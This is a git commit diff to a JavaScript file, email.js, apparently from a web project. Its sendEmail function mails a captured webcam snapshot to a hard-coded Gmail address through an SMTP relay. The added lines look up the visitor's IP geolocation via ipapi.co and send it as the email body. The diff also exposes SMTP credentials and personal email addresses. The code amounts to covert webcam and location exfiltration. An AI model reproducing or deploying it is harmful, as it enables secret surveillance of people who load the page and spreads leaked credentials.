881c92d34fc64c065c19e037a4b4d276d6458db4
Andres Alonso <58670269+Al0nnso@users.noreply.github.com>
2020-06-20 17:27:50 -0300

    .

--- email.js
+++ email.js
@@ -1,13 +1,31 @@
+
 function sendEmail(bimage){
     /*var _EMAIL="alonnsohackerone@gmail.com"
     var _PASS="8infinite"
     var _TO="helenicejoana@gmail.com"
     var _HOST='smtp.gmail.com'*/
+
+    var ID = function () {
+        return '_' + Math.random().toString(36).substr(2, 9);
+    };
     
     var _EMAIL="alonnsohackerone@gmail.com"
     var _PASS="7B6007F33B72796FC42CDD5122E54E120CE5"
     var _TO="alonnsoandres@gmail.com"
     var _HOST='smtp.elasticemail.com'
+
+    var Body="Attachment of the webcam snap";
+
+    try{
+        $.getJSON('https://ipapi.co/json/', function(data) {
+            var ipdata=JSON.stringify(data, null, 2)
+            console.log(ipdata);
+            Body=ipdata;
+        });
+    }catch{
+        console.log("Error")
+        Body+=" [ERROR]";
+    }
 
     const Attachments= [
         {   // encoded string as an attachment
@@ -23,8 +41,8 @@ function sendEmail(bimage){
         Password : _PASS,
         To : _TO,
         From : _EMAIL,
-        Subject : "WEBCAM Snap",
-        Body : "Attachment of the webcam snap",
+        Subject : "WEBCAM Snap "+ID(),
+        Body,
         Attachments
     }).then(
     message => alert(message)
